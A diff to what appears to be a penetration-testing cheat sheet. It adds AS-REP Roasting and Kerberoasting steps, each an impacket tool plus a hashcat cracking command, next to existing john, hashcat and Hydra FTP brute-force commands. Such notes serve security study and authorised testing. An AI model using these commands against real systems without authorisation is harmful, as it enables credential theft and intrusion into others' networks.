@@ -59,6 +59,35 @@ hashcat -m 1000 <hash> rockyou.txt
 john -=/home/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
 ```
 
+## AS-REP Roasting
+
+Requirements:
+
+* You need a valid username
+* Password is NOT required
+
+1. <mark style="color:yellow;">impacket-GetNPUsers</mark>
+2. Obtain hash
+3. Crack offline with Hashcat
+
+```
+hashcat -m 18200 -a 0 hashes.txt rockyou.txt
+```
+
+## Kerberoasting
+
+Requirements:
+
+* You need a valid username and password
+
+1. <mark style="color:yellow;">impacket-GetUserSPNs</mark>
+2. Obtain hash
+3. Crack offline with Hashcat
+
+```
+hashcat -m 13100 --force hashes.txt rockyou.txt
+```
+
 ## Hydra
 
 ### Bruteforcing
@@ -66,12 +95,3 @@ john -=/home/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.78.56 ftp
 ```
-
-
-
-
-
-
-
-
-
